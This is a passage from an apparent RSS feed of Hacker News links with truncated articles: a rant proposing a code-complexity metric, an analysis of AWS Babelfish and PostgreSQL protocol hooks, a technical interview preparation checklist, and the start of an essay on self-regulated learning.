shows up in flip-flops and after a five-minute conversation solves your problem? He’s just some smart eleck showman, probably a con man.</p><p>We don’t teach coders the one skill they need most of all: adding incremental complexity as-needed. Nobody talks about choosing what to add and why. Nobody talks about ways to understand you’ve gone too far (except for a few folks like me. Apologies for the shameless plug.)</p><p>For some odd reason, discussions on frameworks and complexity always devolve into some version of “Dang kids!” vs. “Talentless luddite!” As many people have pointed out, not only do we not teach or talk about incremental complexity, if you don’t have the appropriate buzzwords in your CV, you don’t get hired. So BigCorps naturally end up with scads of people who did well on scads of tech that somebody decide they had to use/learn but nobody very good at actually making things happen.</p><p>This can't continue, and I want to do my part in making it end. The answer I came up is something I call it <strong>Code Cognitive Load (CCL)</strong>. It's the amount of risk you take on as a programmer looking at any piece of code to manipulate it, whether coding fresh or doing maintenance on existing code.</p><ol><li>It's scoped first by method/function and then by compilation unit. There's no other scoping (namespace, class, module, etc.)</li><li>To compute, you add up four things: symbols you are required to look at to do your work, exceptions that using those symbols may throw, &nbsp;any editable code underneath that you may have to read or write for those symbols to work, and exceptions that code may throw</li></ol><p>You can see for the first Hello World example, there's only one symbol, echo, and there's only one general type of exception, and that's related to system resources. For the second example, the count easily goes into the dozens.</p><p>Why is this related to the security problem I led off with? Because if you have code you can't reason about, you don't just have a risk for bugs, it's a security risk too. The code doesn't care whether it's busy screwing up your beautiful solution or hacking your local network. You can't reason about it. Period. That's the problem. It's doing whatever it's coded to do.</p><p>Do npm packages count as "editable code underneath that I have to read or write for these symbols to work"? Sure, if you're downloading code and compiling it, you may have to edit it. It's a risk. If you're just hotlinking to a dll or something, that's different. If you're using precompiled code, whatever you've got, you've got. It may be buggy as hell and it may do nasty things that make you sad and drink by yourself late at night, but it's not a complexity issue, it's some other kind of issue, security, performance, and so on. Don't confuse them. You address and work with the problems of that precompiled library in a totally different way than you would with code you may one day have to plow through.</p><p>Code Cogntivie Load (CCL) is not a good/bad metric. It's a measure of the risk in complexity you're assuming to do whatever work you have to do. Some problems may naturally require a great deal of complexity risk. Others not so much. That's your call, not mine.</p><p>The point is that you're measuring it, instead of just ignoring it until something goes wrong. Is your solution doing mostly the same thing but your CCL is going through the roof? You're most likely doing something wrong, since your code's value is staying the same while your coding risk is dramatically increasing. </p><p>There's no way of knowing whether code is appropriately complex or not, but we can (and should) measure how much <em>complexity risk</em> we're taking on ourselves and our downstream maintenance workers.</p><p>This will change the way you code and the way you think about coding. Good. Looking at the software landscape today, things need changing.</p><p>&lt;/rant&gt;</p>    </div>
</div></div>]]>
            </description>
            <link>https://danielbmarkham.com/for-the-love-of-all-thats-holy-use-ccl-to-control-complexity-in-your-systems/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26114364</guid>
            <pubDate>Fri, 12 Feb 2021 15:04:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AWS Babelfish: The Elephant in the PostgreSQL Room?]]>
            </title>
            <description>
<![CDATA[
Score 192 | Comments 158 (<a href="https://news.ycombinator.com/item?id=26114281">thread link</a>) | @ahachete
<br/>
February 12, 2021 | https://postgresql.fund/blog/babelfish-the-elephant-in-the-room/ | <a href="https://web.archive.org/web/*/https://postgresql.fund/blog/babelfish-the-elephant-in-the-room/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <div>
        <div>
            <div>
                
                <div>
                    <p>On December 1st, 2020, <a href="https://aws.amazon.com/blogs/opensource/want-more-postgresql-you-just-might-like-babelfish/">Amazon AWS announced Babelfish</a>. Babelfish “<em>adds an endpoint to PostgreSQL that understands the SQL Server wire protocol Tabular Data Stream (TDS), as well as commonly used T-SQL commands used by SQL Server. Support for T-SQL includes elements such as the SQL dialect, cursors, catalog views, data types, triggers, stored procedures, and functions</em>”. Wow. <strong>SQL Server wire and application compatibility for PostgreSQL!</strong></p>
<p>What this means is that Babelfish will be able to “impersonate” a SQL Server database. Applications may be able to run unchanged, believing that they are connecting to SQL Server, when they will actually be connecting to PostgreSQL-Babelfish.</p>
<p>Surely, compatibility will not be 100% at the beginning. But it will keep improving, and <strong>as long as it provides enough compatibility for a nice set of applications to run unchanged on Babelfish, it will open the door to migrations and replacing SQL Servers with Babelfish</strong>. This is very good news for the PostgreSQL Community!</p>
<h2 id="brief-analysis-on-postgresql-popularity">Brief analysis on PostgreSQL popularity</h2>
<p><a href="https://db-engines.com/en/blog_post/85">PostgreSQL has been named (again) database of the year 2020</a>. This award is given based on “<em>DBMSs sorted by how much they managed to increase their popularity in 2020</em>”, which means that <strong>PostgreSQL was the database that grew the most in popularity in 2020</strong>. <strong>But in absolute terms, PostgreSQL’s popularity is still way behind that of Oracle, MySQL and SQL Server</strong>. Let’s analyze <a href="https://db-engines.com/en/ranking_trend">db-engines popularity trend chart</a> for the Top4 DBMS, on a linear scale (db-engines presents results on a logarithmic scale):</p>
<p><img src="https://postgresql.fund/img/dbengines_popularity_ranking-linear-900.png" alt="DB-engines popularity ranking - linear scale"></p>
<p>The trends for the last 8 years are clear: Oracle and SQL Server are constantly declining in popularity; MySQL is slightly declining; and PostgreSQL is clearly growing in popularity. But while PostgreSQL almost tripled in popularity in these eight years, it is still far behind the other three.</p>
<p>PostgreSQL became the database of 2020 because its popularity grew the most in the last year. The other three mentioned databases declined in popularity during 2020. If we assume the same rate of change in popularity will continue for the upcoming years, by 2025 PostgreSQL would still remain in the 4th place, albeit close to SQL Server. It won’t overtake SQL Server until 2026, and by 2030 PostgreSQL would still lag behind Oracle and MySQL.</p>
<table>
<thead>
<tr>
<th></th>
<th>Jan 21</th>
<th>+/- Jan 20</th>
<th>Est. 2025</th>
<th>Est. 2030</th>
</tr>
</thead>
<tbody>
<tr>
<td><em>Oracle</em></td>
<td>1,317</td>
<td>-28</td>
<td>1,204</td>
<td>1,064</td>
</tr>
<tr>
<td><em>MySQL</em></td>
<td>1,243</td>
<td>-24</td>
<td>1,146</td>
<td>1,025</td>
</tr>
<tr>
<td><em>Microsoft SQL Server</em></td>
<td>1,023</td>
<td>-71</td>
<td>740</td>
<td>386</td>
</tr>
<tr>
<td><em>PostgreSQL</em></td>
<td>551</td>
<td>44</td>
<td>727</td>
<td>947</td>
</tr>
</tbody>
</table>
<p>How is this analysis related to Babelfish? <strong>Babelfish opens the door to new users, new markets, new opportunities. <strong>Babelfish may bump PostgreSQL’s popularity further, targeting use cases that either PostgreSQL is not able to reach today; or can only reach via complex technology migrations.</strong> Babelfish could be one of the many potential boosts that PostgreSQL needs in order to become a more universally used database</strong>.</p>
<h2 id="to-fork-or-not-to-fork-thats-the-question">To fork, or not to fork, that’s the question</h2>
<p>In their announcement, AWS said that “<em>We are open sourcing Babelfish in 2021. […] We are releasing Babelfish under the Apache 2.0 license. We invite others to become active in the project, and we will see it as a sign of success when developers outside of AWS become committers or maintainers. You can help by adding or extending Babelfish functionality, submitting feature requests, working on documentation, and contributing test cases</em>”. They also mentioned the code will be published on GitHub.</p>
<p><strong>At the time Babelfish will be published, it will likely require changes to PostgreSQL to enable Babelfish to be an extension</strong>. Some people may call that a “fork” of PostgreSQL, and others may call it a “development branch”. The difference between the two will only be clear over time. Note that PostgreSQL development model doesn’t use feature branches, and in my opinion it’s a great model –but this is an entirely different topic. It is really appreciated that AWS is releasing the code as open source, and under a permissive license (that should be compatible with PostgreSQL’s). <strong>If AWS developers work with the PostgreSQL Community to get the necessary changes merged into PostgreSQL core, then it would have been a development branch, and not a fork. This is something that the PostgreSQL Community and all parties involved need to figure out</strong>.</p>
<p>On January 25th, Amazon AWS made a first move. In an <a href="https://www.postgresql.org/message-id/CAGBW59d5SjLyJLt-jwNv%2BoP6esbD8SCB%3D%3D%3D11WVe5%3DdOHLQ5wQ%40mail.gmail.com">email to PostgreSQL’s hackers mailing list</a>, Jan Wieck, a well-known Postgres-er, proposed to start discussing the implementation of protocol hooks. These hooks would enable to implement SQL Server’s protocol as an extension, rather than a fork.</p>
<p>Protocol hooks are, possibly, not the only hooks or modifications to PostgreSQL core that would be required to integrate the whole Babelfish project. With those changes to the core most of the Babelfish code could possibly be integrated in core as an extension(s). I cannot estimate the complexity of these core changes. But I believe that it would be a worthwhile effort, an effort that may further increase PostgreSQL outreach.</p>
<p>Only very recently (Feb 10th, 11th) some initial, very interesting, discussion around this proposal has started (including a very interesting offer to <a href="https://www.postgresql.org/message-id/CADUqk8UndFi7WHVNZscs4ZCk37_2aBUw-K32QA7sQd_3cJ%2Bqng%40mail.gmail.com">open source MySQL protocol compatibility for Postgres!</a>). It’s understandable, it’s a very busy time for PostgreSQL hackers (the last Commitfest for feature inclusion into PostgreSQL 14 is ongoing). But Babelfish was already announced more than two months ago; and it could be published anytime. I believe we need to start a deeper conversation about Postgres-Babelfish integration sooner than later. And what is being discussed so far are mainly technical considerations around the integration of one of the possibly several integration points that may be required. <strong>I’d love to also have a strategic discussion, where the Community would address, from a leadership perspective, what would be the plans for integrating, or not, Babelfish</strong>. <strong>Is Babelfish the Elephant in the Room?</strong> Probably not anymore, but I anyway hope this post will help, at the very least, to spark the strategic discussion.</p>
<p>What is the alternative? What will happen if PostgreSQL would not implement such hooks or will not pursue understanding with AWS, for the common benefit, and help Babelfish and PostgreSQL cooperate and allow for code bases integration?</p>
<p><strong>Under this scenario, AWS will probably have to keep Babelfish as a fork</strong>. For one, AWS already keeps Aurora as a fork, even though it’s an internal one. Given AWS’ well-known customer obsession and that AWS doesn’t kill services that they started offering, I think that if given no other chance they will keep Babelfish as a separate fork, getting its own share of features and contributors. Surely AWS knows that maintaining a fork is expensive. And I believe they have no intention to have it as a fork (otherwise, they won’t be publishing it as open source). So there will be serious intentions and efforts to merge it into PostgreSQL, for the benefit of all. But the recent Elastic case has demonstrated that AWS is committed to the open source software that is part of their managed services, and are willing to step up with a lot of resources when they are required to continue serving their customers. Apparently AWS has around 200 open job positions (!!) for developers working on Elasticsearch. Surely they can do the same for Babelfish, especially given that RDS Postgres/Aurora/Babelfish is probably a much larger business for them than Elastic.</p>
<h2 id="on-protocol-hooks">On protocol hooks</h2>
<p>Jan also argued that “<em>Creating the necessary infrastructure in the postmaster and backend will open up more possibilities, that are not tied to our compatibility efforts. Possible use cases for wire protocol extensibility include the development of a completely new, not backwards compatible PostgreSQL protocol or extending the existing wire protocol</em>”. I cannot agree more. This effort not only benefits the Babelfish integration; but also opens the door for new PostgreSQL protocols.</p>
<p>The current PostgreSQL protocol (v3) <a href="https://www.postgresql.org/docs/7.4/release-7-4.html">has been in use since PostgreSQL 7.4</a>, released in 2003. It works well, and has spun the broadest possible set of drivers, tools and even compatible databases that use it (like CockroachDB, Crate.io or NoisePage, for example). But it also has some limitations and well-known problems. There is an entry in PostgreSQL “TODO” about <a href="https://wiki.postgresql.org/wiki/Todo#Wire_Protocol_Changes_.2F_v4_Protocol">proposed changes for an eventual v4 version of the protocol</a>. I also participated in another <a href="https://github.com/pgjdbc/pgjdbc/blob/95ba7b261e39754674c5817695ae5ebf9a341fae/backend_protocol_v4_wanted_features.md">“brain dump” on v4 proposed features</a>. But despite much talk, v4 has not happened and there’s no ongoing effort to make it happen. v3 is to stay for long.</p>
<p>Why is that, why can’t the protocol evolve? Have a look at <a href="https://www.postgresql.org/message-id/CD5C1525-8B2C-4986-87F0-B1CB3B52ACA7%40wa-research.ch">this thread</a>, where a proposal to implement an HTTP protocol for PostgreSQL was made. Other than the proposal about HTTP itself –which has its own merits, and is a topic that I believe should definitely be discussed again–, the general sentiment was that <strong>any new protocol would have to provide all the features that the current protocol has, work for every use case, do not disrupt existing drivers or provide good means for driver rewrites; and do it significantly better than the current one</strong>.</p>
<h2 id="the-innovators-dilemma">The Innovator’s Dilemma</h2>
<p>I don’t have an MBA, but this to me is a clear case of <a href="https://en.wikipedia.org/wiki/The_Innovator%27s_Dilemma">The Innovator’s Dilemma</a>. PostgreSQL protocol v3 is the incumbent, and protocol v4 and/or other protocols like HTTP are the potential disruptive innovators. In what looks like a perfect match for Christensen’s book, a disruptive protocol innovation “<em>would not initially satisfy the demands of even the high end of the market</em>”. In other words, initial versions of these protocols should not target feature parity with the incumbent. They should rather focus on doing the basics, but much better, with a compelling higher value proposition.</p>
<p>Eventually, these protocols “<em>will surpass sustaining technologies</em>” and may end up replacing the current v3 protocol. This was very well explained by Prof. Clayton and is represented on his famous graph comparing the product …</p></div></div></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://postgresql.fund/blog/babelfish-the-elephant-in-the-room/">https://postgresql.fund/blog/babelfish-the-elephant-in-the-room/</a></em></p>]]>
            </description>
            <link>https://postgresql.fund/blog/babelfish-the-elephant-in-the-room/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26114281</guid>
            <pubDate>Fri, 12 Feb 2021 14:58:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Technical Interview Preparation Checklist (2019)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26114042">thread link</a>) | @trekhleb
<br/>
February 12, 2021 | https://trekhleb.dev/blog/2019/technical-interview-preparation-checklist/ | <a href="https://web.archive.org/web/*/https://trekhleb.dev/blog/2019/technical-interview-preparation-checklist/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span>
      <span></span>
  <img alt="Technical Interview Preparation Checklist" title="Technical Interview Preparation Checklist" src="https://trekhleb.dev/static/feabdd752148451ef943de015efee4c2/00d43/01-cover.png" srcset="https://trekhleb.dev/static/feabdd752148451ef943de015efee4c2/63868/01-cover.png 250w,
https://trekhleb.dev/static/feabdd752148451ef943de015efee4c2/0b533/01-cover.png 500w,
https://trekhleb.dev/static/feabdd752148451ef943de015efee4c2/00d43/01-cover.png 1000w,
https://trekhleb.dev/static/feabdd752148451ef943de015efee4c2/aa440/01-cover.png 1500w,
https://trekhleb.dev/static/feabdd752148451ef943de015efee4c2/e8950/01-cover.png 2000w" sizes="(max-width: 1000px) 100vw, 1000px" loading="lazy">
    </span></p>
<p>This article is my attempt to summarise common technical interview process steps and to collect in one place some useful insights from recruiters that they normally send to applicants before the interviews. This is not a comprehensive guide of the interview process and the actual interview steps may vary from company to company.</p>
<h2 id="interview-process-overview">Interview Process Overview<a href="#interview-process-overview" aria-label="interview process overview permalink"></a></h2>
<p><span>
      <span></span>
  <img alt="Tech Interview Process" title="Tech Interview Process" src="https://trekhleb.dev/static/ce9805aacee3c6f998d5a37d281b7af1/00d43/11.png" srcset="https://trekhleb.dev/static/ce9805aacee3c6f998d5a37d281b7af1/63868/11.png 250w,
https://trekhleb.dev/static/ce9805aacee3c6f998d5a37d281b7af1/0b533/11.png 500w,
https://trekhleb.dev/static/ce9805aacee3c6f998d5a37d281b7af1/00d43/11.png 1000w,
https://trekhleb.dev/static/ce9805aacee3c6f998d5a37d281b7af1/aa440/11.png 1500w,
https://trekhleb.dev/static/ce9805aacee3c6f998d5a37d281b7af1/e8950/11.png 2000w" sizes="(max-width: 1000px) 100vw, 1000px" loading="lazy">
    </span></p>
<h3 id="interview-process-by-time">Interview Process By Time<a href="#interview-process-by-time" aria-label="interview process by time permalink"></a></h3>
<p><span>
      <span></span>
  <img alt="Interview Process By Time" title="Interview Process By Time" src="https://trekhleb.dev/static/bff2a98064cac4a8b012f0305be31933/00d43/0.png" srcset="https://trekhleb.dev/static/bff2a98064cac4a8b012f0305be31933/63868/0.png 250w,
https://trekhleb.dev/static/bff2a98064cac4a8b012f0305be31933/0b533/0.png 500w,
https://trekhleb.dev/static/bff2a98064cac4a8b012f0305be31933/00d43/0.png 1000w,
https://trekhleb.dev/static/bff2a98064cac4a8b012f0305be31933/2cefc/0.png 1400w" sizes="(max-width: 1000px) 100vw, 1000px" loading="lazy">
    </span></p>
<p>The common technical interview process consists of three main steps:</p>
<ol>
<li><strong>Phone interview with recruiter</strong> when you’ll be ask to tell about your experience and explain your motivation.</li>
<li><strong>Technical phone interview</strong> where you’ll be asked to solve some tech problems in real time.</li>
<li><strong>On-site (in-person) interview</strong> in company’s office when you’ll be asked to solve technical and system design problems as well as to answer some behavioural questions.</li>
</ol>
<h3 id="interview-process-by-meaning">Interview Process By Meaning<a href="#interview-process-by-meaning" aria-label="interview process by meaning permalink"></a></h3>
<p><span>
      <span></span>
  <img alt="Interview Process By Meaning" title="Interview Process By Meaning" src="https://trekhleb.dev/static/c914c00e8131c3fcb4efb312336fb7a3/00d43/1.png" srcset="https://trekhleb.dev/static/c914c00e8131c3fcb4efb312336fb7a3/63868/1.png 250w,
https://trekhleb.dev/static/c914c00e8131c3fcb4efb312336fb7a3/0b533/1.png 500w,
https://trekhleb.dev/static/c914c00e8131c3fcb4efb312336fb7a3/00d43/1.png 1000w,
https://trekhleb.dev/static/c914c00e8131c3fcb4efb312336fb7a3/98432/1.png 1383w" sizes="(max-width: 1000px) 100vw, 1000px" loading="lazy">
    </span></p>
<p>All interview steps are mainly consists of three following building blocks:</p>
<ol>
<li><strong>Problem solving.</strong> The main focus here is your ability to solve technical problems by applying different algorithmic approaches and data structures.</li>
<li><strong>System design.</strong> This one is about your ability to combine many pieces (frameworks, approaches, databases, micro-services) and design a system as a whole that will successfully solve certain tasks.</li>
<li><strong>Behavioural questions</strong> that are focused on your experience, motivations, leadership and soft skills.</li>
</ol>
<p>Let’s move on and touch every of these 6 aspects of the interview process.</p>
<hr>
<h2 id="interview-by-time-introductory-call">[Interview By Time] Introductory Call<a href="#interview-by-time-introductory-call" aria-label="interview by time introductory call permalink"></a></h2>
<p><span>
      <span></span>
  <img alt="Introductory Call" title="Introductory Call" src="https://trekhleb.dev/static/129f667a0ec3ad9adf3af2e2acd75ae9/00d43/2.png" srcset="https://trekhleb.dev/static/129f667a0ec3ad9adf3af2e2acd75ae9/63868/2.png 250w,
https://trekhleb.dev/static/129f667a0ec3ad9adf3af2e2acd75ae9/0b533/2.png 500w,
https://trekhleb.dev/static/129f667a0ec3ad9adf3af2e2acd75ae9/00d43/2.png 1000w,
https://trekhleb.dev/static/129f667a0ec3ad9adf3af2e2acd75ae9/2cefc/2.png 1400w" sizes="(max-width: 1000px) 100vw, 1000px" loading="lazy">
    </span></p>
<p>Recruiter will introduce himself and give you more details about the company and projects you might be working on. You’ll be asked to introduce you and explain what was your responsibility on the previous projects.</p>
<p>Normally only things you did during the last 1–3 years matters. So focus on your latest achievements and responsibilities.</p>
<p>Introduce your side-projects, open-source projects and production projects from your latest workplace.</p>
<p>It will be done by means of telephone.</p>
<p>Things to remember:</p>
<ul>
<li>Get familiar with the job description and prepare your questions regarding the job.</li>
<li>Prepare a short introduction of yourself in the context of your profile, professional past, qualifications and education.</li>
<li>Use specific examples. The strongest examples are work based examples, but you can also use study or personal examples.</li>
<li>If you haven’t understood the interviewer’s question, ask them to repeat it or explain it further.</li>
<li>Learn about the company, be passioned about the company’s product (about what company is doing).</li>
<li>Feel free to ask any questions you have about the role or company in general.</li>
</ul>
<p>Explain yours experience examples in a clear manner. Using the STAR technique will help you:</p>
<ul>
<li><em>SITUATION/TASK</em> — Describe the situation/task you faced and the context of the story.</li>
<li><em>ACTION</em> — What actions did you take?</li>
<li><em>RESULTS</em> — How did you measure success for this project? What results did you achieve?</li>
</ul>
<h3 id="-links-to-explore">📚 Links to explore<a href="#-links-to-explore" aria-label=" links to explore permalink"></a></h3>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Situation,_task,_action,_result">STAR technique on Wikipedia</a></li>
<li><a href="https://www.youtube.com/watch?v=0nN7Q7DrI6Q">STAR technique on YouTube</a></li>
<li><a href="https://careersidekick.com/questions-to-ask-the-interviewer/">105 Smart Questions To Ask In An Interview</a></li>
</ul>
<p><em>ℹ️ ️️Read more about how to prepare to <strong>behavioural interview</strong> below in this article.</em></p>
<h2 id="interview-by-time-technical-phone-interview">[Interview By Time] Technical Phone Interview<a href="#interview-by-time-technical-phone-interview" aria-label="interview by time technical phone interview permalink"></a></h2>
<p><span>
      <span></span>
  <img alt="Technical Phone Interview" title="Technical Phone Interview" src="https://trekhleb.dev/static/faed091665fba40cbcd5f216f24add10/00d43/3.png" srcset="https://trekhleb.dev/static/faed091665fba40cbcd5f216f24add10/63868/3.png 250w,
https://trekhleb.dev/static/faed091665fba40cbcd5f216f24add10/0b533/3.png 500w,
https://trekhleb.dev/static/faed091665fba40cbcd5f216f24add10/00d43/3.png 1000w,
https://trekhleb.dev/static/faed091665fba40cbcd5f216f24add10/2cefc/3.png 1400w" sizes="(max-width: 1000px) 100vw, 1000px" loading="lazy">
    </span></p>
<p>During the phone interview you’ll have a coding exercise (or task to develop something online).</p>
<p>The call will be 45–60 minutes long.</p>
<p>Some interviews will include 2 people. Don’t worry — one will be there purely for training purposes.</p>
<p>You will need access to a webcam. Wired internet and headphones are recommended but not essential. Your computer may require a plug-in install, so make sure you test the link that will be provided to you by recruiter with enough time before your call. Make sure to take the call in a calm environment.</p>
<p>You might be asked to install and/or use special programs and service like:</p>
<ul>
<li><a href="https://aws.amazon.com/chime/">Amazon Chime</a></li>
<li><a href="https://www.bluejeans.com/">BlueJeans</a></li>
<li><a href="https://hangouts.google.com/">Hangouts</a></li>
<li><a href="https://zoom.us/">Zoom.us</a></li>
<li><a href="https://www.skype.com/en/">Skype</a></li>
<li><a href="https://coderpad.io/">CoderPad</a> or others</li>
</ul>
<p><strong>What to expect during the interview:</strong></p>
<ul>
<li>45 mins initial interview with 1–2 coding questions using a whiteboard (if on site) or laptop and a service similar to CoderPad (if remote).</li>
<li>You will be tested on your problem solving and core CS fundamental skills (theory, algorithms, data structures, design patterns, recursions, binary tree questions, Fibonacci series etc.)</li>
<li>You will need to think of an efficient, optimised and bug-free solution to code up quickly and concisely in whatever language you code best in.</li>
<li>Keep it simple! If you think it’s obvious, it probably is. Start with a simple solution, and think about making it more efficient afterwards.</li>
</ul>
<p><em>ℹ️ ️️Read more about how to prepare to <strong>problem solving</strong> interview below in this article.</em></p>
<h2 id="interview-by-time-on-site-interview">[Interview By Time] On-Site Interview<a href="#interview-by-time-on-site-interview" aria-label="interview by time on site interview permalink"></a></h2>
<p><span>
      <span></span>
  <img alt="On-Site Interview" title="On-Site Interview" src="https://trekhleb.dev/static/fb1848a66b4221004f977db3a0146512/00d43/4.png" srcset="https://trekhleb.dev/static/fb1848a66b4221004f977db3a0146512/63868/4.png 250w,
https://trekhleb.dev/static/fb1848a66b4221004f977db3a0146512/0b533/4.png 500w,
https://trekhleb.dev/static/fb1848a66b4221004f977db3a0146512/00d43/4.png 1000w,
https://trekhleb.dev/static/fb1848a66b4221004f977db3a0146512/2cefc/4.png 1400w" sizes="(max-width: 1000px) 100vw, 1000px" loading="lazy">
    </span></p>
<p>For the on-site, you generally have 4 to 5 interviews — at least 2 strictly focused on coding, 1 on design, and 1 on conversation/coding. So basically all three building blocks described at the beginning of the chapter will be included.</p>
<p>There will be a 45-minute lunch to break up your day — the lunch will most likely be with one of the engineers. Feel free to be very candid with the engineer — they will not be providing feedback, but are there to answer any questions/concerns you may not have asked during your interview.</p>
<p><em>ℹ️ Read more about how to prepare to <strong>problem solving</strong>, <strong>system design</strong> and <strong>behavioural interviews</strong> below in this article.</em></p>
<hr>
<h2 id="interview-by-meaning-problem-solving-interview">[Interview By Meaning] Problem Solving Interview<a href="#interview-by-meaning-problem-solving-interview" aria-label="interview by meaning problem solving interview permalink"></a></h2>
<p><span>
      <span></span>
  <img alt="Problem Solving Interview" title="Problem Solving Interview" src="https://trekhleb.dev/static/835ae62dee5d08363321703e2d9c177d/00d43/5.png" srcset="https://trekhleb.dev/static/835ae62dee5d08363321703e2d9c177d/63868/5.png 250w,
https://trekhleb.dev/static/835ae62dee5d08363321703e2d9c177d/0b533/5.png 500w,
https://trekhleb.dev/static/835ae62dee5d08363321703e2d9c177d/00d43/5.png 1000w,
https://trekhleb.dev/static/835ae62dee5d08363321703e2d9c177d/98432/5.png 1383w" sizes="(max-width: 1000px) 100vw, 1000px" loading="lazy">
    </span></p>
<p><img src="https://trekhleb.dev/posts-assets/52b4adbcbfcd8ca9db20418c080c3d99/6.gif"></p>
<p><strong>General tips:</strong></p>
<ul>
<li><strong>Explain</strong> — Interviewers want to understand how you think, so explain your thought process and decision making throughout the interview. Remember they are not only evaluating your technical ability, but also how you solve problems. Explicitly state and check assumptions with your interviewer to ensure they are reasonable.</li>
<li><strong>​Clarify</strong> — Many questions will be deliberately open-ended to provide insight into what categories and information you value within the technological puzzle. Interviewers are looking to see how you engage with the problem and your primary method for solving it. Be sure to talk
through your thought process and feel free to ask specific questions if you need clarification.</li>
<li><strong>Improve</strong> — Think about ways to improve the solution you present. It’s worthwhile to think out loud about your initial thoughts to a question. In many cases, your first answer may need some refining and further explanation. If necessary, start with the brute force solution and improve
on it — just let the interviewer know that’s what you’re doing and why.</li>
<li><strong>Practice</strong> — You won’t have access to an IDE or compiler during the interview so practice writing code on paper or a whiteboard. Be sure to test your code and ensure it’s easily readable without bugs. Don’t stress about small syntactical errors like which substring to use for a given method (e.g. start, end or start, length) — just pick one and let your interviewer know.</li>
</ul>
<h3 id="before-the-interview">Before the interview<a href="#before-the-interview" aria-label="before the interview permalink"></a></h3>
<p><strong>Practice! Practice! Practice!</strong></p>
<p>Put yourself under time constraints as speed is important in the interview.</p>
<p><strong>Problems examples:</strong></p>
<ul>
<li>Write the code to print the first element of each “row” of a binary tree.</li>
<li>Implement tic-tac-toe.</li>
<li>Write the code to show the number and type of permutations of a given string.</li>
</ul>
<p>You may use the following services to get more problems examples and possible solutions:</p>
<ul>
<li><a href="https://leetcode.com/">LeetCode</a></li>
<li><a href="https://www.interviewbit.com/practice/">InterviewBit</a></li>
<li><a href="https://www.geeksforgeeks.org/">GeeksForGeeks</a></li>
<li><a href="https://www.hackerrank.com/">HackerRank</a></li>
<li><a href="https://www.lintcode.com/">LintCode</a></li>
<li><a href="https://projecteuler.net/">Coding problems on Project Euler</a></li>
</ul>
<p>You might also want to read <a href="http://www.crackingthecodinginterview.com/">Cracking the coding interview book</a> that will help you to prepare for coding interviews similar to what you will be solving throughout the interview process.</p>
<p><strong>Topics to cover:</strong></p>
<ul>
<li><strong>Coding</strong> — You should know at least one programming language really well, preferably C++, Java, Python, JavaScript, Go, or C. You will be expected to know APIs, Object Oriented Design and Programming, how to test your code, as well as come up with corner cases and edge cases for code. Note that interviewers will focus on conceptual understanding rather than memorisation.</li>
<li><strong>Algorithms</strong> — Approach the problem with both bottom-up and top-down algorithms. You will be expected to know the complexity of an algorithm and how you can improve/change it. Algorithms that are used to solve problems include sorting (plus searching and binary search), divide-and-conquer, dynamic programming/memoization, greediness, recursion or algorithms linked to a specific data structure. Know Big-O notations (e.g. run time) and be ready to discuss complex algorithms like Dijkstra and A*. Knowing the runtimes, theoretical limitations, and basic implementation strategies of different classes of algorithms is more important than memorising the specific details of any given algorithm.</li>
<li><strong>Sorting</strong> — Be familiar with common sorting functions and on what kind of input data they’re efficient on or not. Think about efficiency means in terms of runtime and space used. For example, in exceptional cases insertion-sort or radix-sort are much better than the generic QuickSort/MergeSort/HeapSort answers.</li>
<li><strong>Data structures</strong> — You should study up on as many data structures as possible. Data structures most frequently used are arrays, linked lists, stacks, queues, hash-sets, hash-maps, hash-tables, dictionary, trees and binary trees, heaps and graphs. You should know the data structure inside out, and what algorithms tend to go along with each data structure.</li>
<li><strong>Mathematics</strong> — Some interviewers ask basic discrete math questions. Spend some time before the interview refreshing your memory on (or teaching yourself) the essentials of elementary probability theory and combinatorics. You should be familiar with n-choose-k problems and their ilk.</li>
<li><strong>Graphs</strong> — Consider if a problem can be applied with graph algorithms like distance, search, connectivity, cycle-detection, etc. There are three basic ways to represent a graph in memory (objects and pointers, matrix, and adjacency list) — familiarize yourself with each representation and its pros and cons. You should know the basic graph traversal algorithms, breadth-first search and depth-first search. Know their computational complexity, their tradeoffs …</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://trekhleb.dev/blog/2019/technical-interview-preparation-checklist/">https://trekhleb.dev/blog/2019/technical-interview-preparation-checklist/</a></em></p>]]>
            </description>
            <link>https://trekhleb.dev/blog/2019/technical-interview-preparation-checklist/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26114042</guid>
            <pubDate>Fri, 12 Feb 2021 14:37:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Is Self-Regulated Learning and Why Is It Important?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26114006">thread link</a>) | @ggoo
<br/>
February 12, 2021 | https://durmonski.com/self-improvement/what-is-self-regulated-learning/ | <a href="https://web.archive.org/web/*/https://durmonski.com/self-improvement/what-is-self-regulated-learning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
																					<div>
																										<p><span>Last updated:</span><time datetime="2021-02-15T16:35:29+00:00">15/02/2021</time></p>
<p><em>After I finished school in 2007 and later graduated from high school in 2012, I thought it was all over. I kind of swore that I’d never touch a textbook again. “Welcome world,” I said, “I’m ready and now I know everything!” Boy was I wrong. I learned the hard way that our complex and rapidly changing world increasingly demands adopting new skills. And what I’ve accumulated as knowledge during my time behind the desk was not even close to what was happening in the real world.</em> <em>Learning, not simply during the years associated with formal schooling, but across the lifespan seemed a must.</em></p>



<p>Mark Twain famously said, “I have never let my schooling interfere with my education.” More than 100 years later, that’s still the case – or at least it should be. We should not, let the material we study now, or years ago when we were in school, satisfy our appetite and our thirst for knowledge.</p>



<p>In our current setting, it’s extremely important to educate yourself and regularly expose yourself to various topics that are not covered by your school, and/or job, curricula. Simply digesting what your teacher shares or what your company is doing is not enough to stay afloat. You need a different point of view. Make unusual connections. Look for inspiration in topics that others might call crazy or insane.</p>



